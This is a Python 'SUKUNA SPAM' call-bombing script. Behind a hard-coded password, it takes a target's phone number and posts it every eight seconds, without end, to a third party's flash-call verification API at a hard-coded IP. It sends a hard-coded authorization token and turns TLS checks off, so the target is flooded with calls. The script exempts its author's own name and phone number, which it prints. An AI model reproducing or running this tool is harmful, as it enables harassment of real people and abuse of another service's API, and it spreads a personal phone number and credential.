import aiohttp
import asyncio
import json
import sys
import os

# Colors
G = '\033[1;32m' # Green
R = '\033[1;31m' # Red
Y = '\033[1;33m' # Yellow
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _    
 / ___|| | | | |/ / | | | \ | |  / \   
 \___ \| | | | ' /| | | |  \| | / _ \  
  ___) | |_| | . \| |_| | |\  |/ ___ \ 
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}SPAM
 {G}Created by: Ali Talib (SUKUNA)
 ---------------------------------------""")

async def __HemoCaller__():
    while True:
        banner()
        # Password System
        password = input(f"{Y}[?] Enter Password: {W}")
        if password != "1121":
            print(f"{R}[!] Wrong Password! Try again.")
            await asyncio.sleep(2)
            continue
        break

    while True:
        banner()
        # Input Target
        target = input(f"{Y}[?] Enter Phone or Name: {W}").lower()

        # Secret Protection for the King (Ali Talib)
        if "ali" in target or "talib" in target or "967713551980" in target:
            print(f"\n{R}💀 ERROR: YOU ARE TRYING TO ATTACK THE KING! 💀")
            print(f"{G}👑 This is my Master: Ali Talib 👑")
            print(f"{R}Don't play with fire, little curse... 👹")
            await asyncio.sleep(4)
            continue # Returns to ask for the number again

        _2Call = target # Use the input as the number
        
        headers = {
            'User-Agent': "okxgvhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'Authorization': "s6abj8F2euaFCk6"
        }

        Ok = 0
        Bad = 0   
        
        print(f"{G}[*] Starting the ritual...{Y}\n")
        
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.post(
                        "https://31.171.171.90/api/phone-numbers/auth-flash-call",
                        data=json.dumps({"phoneNumber": _2Call}),
                        headers=headers,
                        ssl=False
                    ) as req:                    
                        text_resp = await req.text()
                        if '{"allow":true}' in text_resp:
                            Ok += 1
                        else:
                            Bad += 1
                except Exception:
                    Bad += 1
                    
                sys.stdout.write(f"\r{G}[+] Sent: {Ok} {R}[-] Failed: {Bad} {W}| {Y}Target: {target}")
                sys.stdout.flush()            
                await asyncio.sleep(8)

if __name__ == "__main__":
    try:
        asyncio.run(__HemoCaller__())
    except KeyboardInterrupt:
        print(f"\n{R}[!] Powering down...")
        sys.exit()
